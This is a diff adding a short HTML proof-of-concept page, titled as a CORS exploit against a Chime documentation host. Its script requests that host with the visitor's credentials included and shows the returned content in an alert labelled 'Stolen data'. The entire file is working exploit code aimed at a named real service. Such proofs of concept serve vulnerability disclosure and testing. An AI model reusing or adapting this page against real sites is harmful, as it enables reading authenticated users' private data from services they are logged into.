@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>🔥 CORS Exploit PoC – Chime</h2>
+    <script>
+      fetch("https://docs-dev1.chime.com/", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        alert("✅ Stolen data:\n\n" + data.slice(0, 600) + "...");
+      });
+    </script>
+  </body>
+</html>
